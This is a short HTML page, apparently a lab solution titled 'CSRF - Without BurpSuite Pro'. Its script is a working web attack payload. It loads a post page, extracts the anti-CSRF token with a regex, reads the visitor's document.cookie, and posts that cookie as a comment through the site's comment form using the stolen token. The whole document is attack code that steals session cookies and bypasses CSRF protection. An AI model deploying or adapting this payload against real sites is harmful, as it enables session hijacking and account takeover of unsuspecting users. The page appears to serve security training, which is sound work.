
<html>
    <head>
        <title>CSRF - Without BurpSuite Pro</title>
    </head>
    <body>
        <script>
            var csrf = '';
            var req = new XMLHttpRequest();
            req.onload = handleResponse;
            req.open('get','/post?postId=3',true);
            req.send();
            req.onreadystatechange = function () {
                csrf = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
                console.log(csrf);
            }
        
            function handleResponse() {
            var cookie = document.cookie
            document.cookie = cookie;
            fetch('/post/comment', {
            method: 'POST',
            mode: 'no-cors',
            body: 'csrf='+csrf+'&postId=3&comment='+cookie+'&name=asdf&email=adsf%40adf&website=http://localhost'
            });
        }
        </script>
    </body>
</html>